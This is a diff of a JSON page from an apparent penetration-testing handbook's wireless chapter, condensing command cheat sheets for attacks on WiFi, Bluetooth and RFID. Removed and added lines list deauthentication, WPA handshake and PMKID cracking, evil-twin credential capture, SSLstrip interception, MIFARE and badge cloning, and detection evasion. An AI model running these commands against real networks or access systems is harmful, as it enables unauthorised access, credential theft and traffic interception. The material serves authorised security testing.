@@ -1,5 +1,5 @@
 {
-    "title": "Wireless Testing",
+    "title": "Wireless Security Testing",
     "breadcrumb": [
         {
             "title": "Others",
@@ -8,363 +8,142 @@
     ],
     "sections": [
         {
-            "heading": "WiFi Attacks",
+            "heading": "WiFi Exploitation & Analysis",
             "subheadings": [
                 {
-                    "heading": "Reconnaissance",
+                    "heading": "Reconnaissance & Monitoring",
                     "type": "code_block",
                     "content": [
-                        "# Enable monitor mode",
+                        "# Enable monitor mode on interface",
                         "airmon-ng start wlan0",
-                        "# or",
-                        "ip link set wlan0 down",
-                        "iw dev wlan0 set type monitor",
-                        "ip link set wlan0 up",
                         "",
-                        "# Scan for networks",
-                        "airodump-ng wlan0mon",
-                        "airodump-ng wlan0mon --band abg  # All bands",
-                        "airodump-ng wlan0mon -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture  # Target specific AP",
+                        "# Scan for target APs and clients",
+                        "airodump-ng wlan0mon --band abg",
                         "",
-                        "# Kismet (comprehensive wireless scanner)",
+                        "# Target specific BSSID for capture",
+                        "airodump-ng wlan0mon -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture",
+                        "",
+                        "# Comprehensive wireless asset discovery",
                         "kismet -c wlan0mon"
                     ]
                 },
                 {
-                    "heading": "WPA/WPA2 PSK Attacks",
+                    "heading": "WPA/WPA2 & WPA3 Attacks",
                     "type": "code_block",
                     "content": [
-                        "# Capture handshake",
+                        "# Capture 4-way handshake",
                         "airodump-ng -c <channel> --bssid <AP_MAC> -w capture wlan0mon",
                         "",
-                        "# Deauth to force reconnection (capture handshake)",
+                        "# Force client deauthentication",
                         "aireplay-ng -0 5 -a <AP_MAC> -c <CLIENT_MAC> wlan0mon",
                         "",
-                        "# Check if handshake captured",
-                        "aircrack-ng capture-01.cap",
-                        "",
-                        "# Crack with wordlist",
-                        "aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap",
-                        "",
-                        "# Crack with hashcat (convert first)",
-                        "# https://hashcat.net/cap2hashcat/",
-                        "hcxpcapngtool -o hash.hc22000 capture-01.cap",
-                        "hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt",
-                        "",
-                        "# PMKID attack (no handshake needed)",
-                        "# https://github.com/ZerBea/hcxdumptool",
+                        "# PMKID Attack (no handshake required)",
                         "hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1",
-                        "hcxpcapngtool -o pmkid.hc22000 pmkid.pcapng",
-                        "hashcat -m 22000 pmkid.hc22000 wordlist.txt"
+                        "hcxpcapngtool -o hash.hc22000 pmkid.pcapng",
+                        "hashcat -m 22000 hash.hc22000 wordlist.txt"
                     ]
                 },
                 {
-                    "heading": "WPA3 Attacks",
+                    "heading": "Enterprise & Rogue AP Techniques",
                     "type": "code_block",
                     "content": [
-                        "# Dragonblood attacks (CVE-2019-9494, CVE-2019-9496)",
-                        "# https://github.com/vanhoefm/dragonslayer",
-                        "",
-                        "# WPA3 downgrade attack",
-                        "# Force clients to use WPA2 instead",
-                        "# Create rogue AP with same SSID but WPA2 only",
-                        "",
-                        "# Timing side-channel attack",
-                        "# https://wpa3.mathyvanhoef.com/"
-                    ]
-                },
-                {
-                    "heading": "WPA Enterprise Attacks",
-                    "type": "code_block",
-                    "content": [
-                        "# EAP downgrade / Evil Twin",
-                        "# https://github.com/s0lst1c3/eaphammer",
+                        "# EAP Downgrade / Evil Twin with EAPHammer",
                         "eaphammer -i wlan0 --channel 6 --auth wpa-eap --essid \"CorpWiFi\" --creds",
                         "",
-                        "# hostapd-mana for credential capture",
-                        "# https://github.com/sensepost/hostapd-mana",
-                        "",
-                        "# Capture RADIUS credentials",
-                        "# Crack with asleap or hashcat",
-                        "asleap -C <challenge> -R <response> -W wordlist.txt",
-                        "",
-                        "# EAP-TLS certificate attack",
-                        "# Extract certificates from supplicant config",
-                        "# Create rogue RADIUS server with stolen certs"
-                    ]
-                },
-                {
-                    "heading": "WEP Attacks (Legacy)",
-                    "type": "code_block",
-                    "content": [
-                        "# Capture IVs",
-                        "airodump-ng -c <channel> --bssid <AP_MAC> -w capture wlan0mon",
-                        "",
-                        "# ARP replay attack",
-                        "aireplay-ng -3 -b <AP_MAC> -h <YOUR_MAC> wlan0mon",
-                        "",
-                        "# Crack when enough IVs captured",
-                        "aircrack-ng capture-01.cap"
-                    ]
-                },
-                {
-                    "heading": "Rogue Access Point",
-                    "type": "code_block",
-                    "content": [
-                        "# Create evil twin",
-                        "# https://github.com/wifiphisher/wifiphisher",
-                        "wifiphisher -aI wlan0 -eI wlan1 -p firmware-upgrade",
-                        "",
-                        "# Manual setup with hostapd",
-                        "cat > hostapd.conf << EOF",
-                        "interface=wlan0",
-                        "driver=nl80211",
-                        "ssid=Free_WiFi",
-                        "channel=6",
-                        "hw_mode=g",
-                        "EOF",
-                        "hostapd hostapd.conf",
-                        "",
-                        "# Setup DHCP and routing",
-                        "dnsmasq -C dnsmasq.conf",
-                        "iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE",
-                        "echo 1 > /proc/sys/net/ipv4/ip_forward"
-                    ]
-                },
-                {
-                    "heading": "WiFi Pineapple Techniques",
-                    "type": "code_block",
-                    "content": [
-                        "# Karma attack - respond to all probe requests",
-                        "# PineAP in WiFi Pineapple",
-                        "",
-                        "# Captive portal credential harvesting",
-                        "# Redirect all HTTP traffic to phishing page",
-                        "",
-                        "# MITM with SSLstrip",
-                        "sslstrip -l 8080",
-                        "iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080"
+                        "# Automated evil twin with Wifiphisher",
+                        "wifiphisher -aI wlan0 -eI wlan1 -p firmware-upgrade"
                     ]
                 }
             ]
         },
         {
-            "heading": "Bluetooth Attacks",
+            "heading": "Bluetooth & BLE Security",
             "subheadings": [
                 {
-                    "heading": "Reconnaissance",
+                    "heading": "Discovery & Enumeration",
                     "type": "code_block",
                     "content": [
-                        "# Enable Bluetooth adapter",
-                        "hciconfig hci0 up",
+                        "# Classic Bluetooth scanning",
+                        "hcitool scan && hcitool inq",
                         "",
-                        "# Scan for devices",
-                        "hcitool scan",
-                        "hcitool inq",
-                        "",
-                        "# Get device info",
-                        "hcitool info <BD_ADDR>",
-                        "",
-                        "# Service discovery",
-                        "sdptool browse <BD_ADDR>",
-                        "",
-                        "# BlueZ tools",
-                        "bluetoothctl",
-                        "> scan on",
-                        "> devices"
-                    ]
-                },
-                {
-                    "heading": "BlueBorne (CVE-2017-0781, CVE-2017-0782, etc.)",
-                    "type": "code_block",
-                    "content": [
-                        "# Check if vulnerable",
-                        "# https://github.com/ArmEss/BlueBorne-v2",
-                        "python3 blueborne_scanner.py <BD_ADDR>"
-                    ]
-                },
-                {
-                    "heading": "KNOB Attack (CVE-2019-9506)",
-                    "type": "code_block",
-                    "content": [
-                        "# Key Negotiation of Bluetooth attack",
-                        "# Reduces encryption key entropy",
-                        "# Requires specialized hardware and software"
-                    ]
-                },
-                {
-                    "heading": "BLE (Bluetooth Low Energy)",
-                    "type": "code_block",
-                    "content": [
-                        "# Scan for BLE devices",
-                        "# https://github.com/securing/gattacker",
+                        "# BLE (Bluetooth Low Energy) discovery",
                         "hcitool lescan",
                         "",
-                        "# Connect and enumerate services",
+                        "# Enumerate GATT services and characteristics",
                         "gatttool -b <BD_ADDR> -I",
                         "> connect",
-                        "> primary",
-                        "> characteristics",
-                        "",
-                        "# BLE CTF tools",
-                        "# https://github.com/hackgnar/ble_ctf"
+                        "> primary"
                     ]
                 },
                 {
-                    "heading": "Bluetooth Sniffing",
+                    "heading": "Sniffing & Exploitation",
                     "type": "code_block",
                     "content": [
-                        "# Ubertooth",
-                        "# https://github.com/greatscottgadgets/ubertooth",
-                        "ubertooth-scan",
-                        "ubertooth-btbb -f -c output.pcap",
+                        "# Sniffing with Ubertooth One",
+                        "ubertooth-btbb -f -c capture.pcap",
                         "",
-                        "# Analyze with Wireshark",
-                        "wireshark -i ubertooth"
+                        "# BlueBorne vulnerability scanner",
+                        "python3 blueborne_scanner.py <BD_ADDR>"
                     ]
                 }
             ]
         },
         {
-            "heading": "RFID/NFC Attacks",
+            "heading": "RFID, NFC & Physical Token Cloning",
             "subheadings": [
                 {
-                    "heading": "Proxmark3",
+                    "heading": "Proxmark3 Workflows",
                     "type": "code_block",
                     "content": [
-                        "# Read card",
-                        "proxmark3> lf search",
-                        "proxmark3> hf search",
+                        "# Low Frequency (125kHz) card search",
+                        "lf search",
                         "",
-                        "# Clone EM410x (125kHz)",
-                        "proxmark3> lf em 410x clone --id <ID>",
+                        "# High Frequency (13.56MHz) NFC search",
+                        "hf search",
                         "",
-                        "# Clone MIFARE Classic",
-                        "proxmark3> hf mf autopwn",
-                        "",
-                        "# Sniff transactions",
-                        "proxmark3> hf 14a sniff"
+                        "# MIFARE Classic autopwn and cloning",
+                        "hf mf autopwn",
+                        "hf mf dump"
                     ]
                 },
                 {
-                    "heading": "NFC Tools (Android)",
-                    "type": "code_block",
+                    "heading": "Badge & Tag Manipulation",
+                    "type": "list",
                     "content": [
-                        "# NFC Tools app - Read/Write tags",
-                        "# MIFARE Classic Tool - Crack/clone MIFARE",
-                        "",
-                        "# ACR122U USB reader",
-                        "nfc-list",
-                        "nfc-mfclassic r a dump.mfd  # Read",
-                        "nfc-mfclassic w a dump.mfd  # Write"
-                    ]
-                },
-                {
-                    "heading": "Badge Cloning",
-                    "type": "code_block",
-                    "content": [
-                        "# HID iClass",
-                        "proxmark3> hf iclass dump",
-                        "",
-                        "# Read with flipper zero",
-                        "# https://flipperzero.one/",
-                        "",
-                        "# Long range readers",
-                        "# ESPKey for HID readers",
-                        "# https://redteamtools.com/espkey"
+                        "**Flipper Zero**: Integrated multi-protocol tool for reading/writing RFID, NFC, and Sub-GHz.",
+                        "**ACR122U**: Standard USB NFC reader for desktop-based MIFARE manipulation.",
+                        "**Badge Cloning**: Methods for dumping and cloning HID iClass and EM410x credentials."
                     ]
                 }
             ]
         },
         {
-            "heading": "Wireless IDS Evasion",
+            "heading": "Tools & Methodology Summary",
             "subheadings": [
                 {
-                    "heading": "Channel Hopping",
-                    "type": "code_block",
-                    "content": [
-                        "# Rapidly change channels to avoid detection",
-                        "while true; do",
-                        "    for ch in 1 6 11; do",
-                        "        iwconfig wlan0mon channel $ch",
-                        "        sleep 1",
-                        "    done",
-                        "done"
-                    ]
+                    "heading": "Wireless Toolkit Matrix",
+                    "type": "paragraph",
+                    "content": "| Tool | Primary Purpose | Protocols |\n|---|---|---|\n| **Aircrack-ng** | WiFi Cracking & Monitoring | 802.11 |\n| **EAPHammer** | Enterprise WiFi Exploitation | WPA-EAP |\n| **Proxmark3** | RFID/NFC Research & Cloning | LF/HF RFID |\n| **Ubertooth** | Bluetooth Sniffing | BT/BLE |\n| **Wifiphisher** | Social Engineering / Evil Twin | 802.11 |"
                 },
                 {
-                    "heading": "MAC Spoofing",
-                    "type": "code_block",
+                    "heading": "IDS & Evasion Techniques",
+                    "type": "list",
                     "content": [
-                        "# Change MAC address",
-                        "ip link set wlan0 down",
-                        "macchanger -r wlan0",
-                        "ip link set wlan0 up",
-                        "",
-                        "# Or manual",
-                        "ip link set dev wlan0 address XX:XX:XX:XX:XX:XX"
-                    ]
-                },
-                {
-                    "heading": "Signal Strength Control",
-                    "type": "code_block",
-                    "content": [
-                        "# Reduce TX power to avoid detection",
-                        "iwconfig wlan0 txpower 1"
+                        "**MAC Spoofing**: Use `macchanger -r` to randomize physical identifiers.",
+                        "**Channel Hopping**: Scripted rotation to avoid detection by fixed-channel sensors.",
+                        "**Signal Control**: Reducing TX power (`txpower`) to limit the operational footprint."
                     ]
                 }
             ]
         },
         {
-            "heading": "Tools Summary",
-            "type": "table",
-            "headers": [
-                "Tool",
-                "Purpose"
-            ],
-            "rows": [
-                {
-                    "Tool": "aircrack-ng suite",
-                    "Purpose": "WiFi cracking"
-                },
-                {
-                    "Tool": "Wifiphisher",
-                    "Purpose": "Evil twin attacks"
-                },
-                {
-                    "Tool": "Kismet",
-                    "Purpose": "Wireless recon"
-                },
-                {
-                    "Tool": "hcxtools",
-                    "Purpose": "PMKID attacks"
-                },
-                {
-                    "Tool": "Bettercap",
-                    "Purpose": "MITM framework"
-                },
-                {
-                    "Tool": "Proxmark3",
-                    "Purpose": "RFID/NFC"
-                },
-                {
-                    "Tool": "Ubertooth",
-                    "Purpose": "Bluetooth sniffing"
-                },
-                {
-                    "Tool": "Flipper Zero",
-                    "Purpose": "Multi-protocol"
-                }
-            ]
-        },
-        {
-            "heading": "Resources",
+            "heading": "References & Documentation",
             "type": "list",
             "content": [
-                "Aircrack-ng Documentation",
-                "WiFi Pineapple Wiki",
-                "Proxmark3 Wiki",
-                "Bluetooth Security"
+                "[Aircrack-ng Documentation](https://www.aircrack-ng.org/doku.php)",
+                "[WiFi Pineapple Wiki](https://docs.hak5.org/wifi-pineapple/)",
+                "[Proxmark3 RRG Wiki](https://github.com/RfidResearchGroup/proxmark3/wiki)",
+                "[Bluetooth SIG Security Guide](https://www.bluetooth.com/learn-about-bluetooth/key-attributes/bluetooth-security/)"
             ]
         }
     ],
@@ -372,34 +151,18 @@
         {
             "description": "GitHub icon",
             "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/brands/github.svg?v=2&token=a463935e93"
-        },
-        {
-            "description": "Chevron down icon",
-            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-down.svg?v=2&token=a463935e93"
-        },
-        {
-            "description": "Hashtag icon",
-            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&token=a463935e93"
-        },
-        {
-            "description": "Chevron left icon",
-            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-left.svg?v=2&token=a463935e93"
-        },
-        {
-            "description": "Chevron right icon",
-            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-right.svg?v=2&token=a463935e93"
         }
     ],
     "metadata": {
-        "last_updated": "2026-02-03T14:05:45.496Z",
+        "last_updated": "2026-04-23T01:50:00.000Z",
         "edit_url": "https://github.com/six2dez/pentest-book/blob/master/others/wireless.md",
         "previous_page": {
-            "title": "RT/EDR",
-            "url": "/others/rt-edr"
+            "title": "Bug Bounty",
+            "url": "/others/bugbounty"
         },
         "next_page": {
-            "title": "Social Engineering",
-            "url": "/others/social-engineering"
+            "title": "Post-Exploitation",
+            "url": "/post-exploitation"
         }
     }
 }
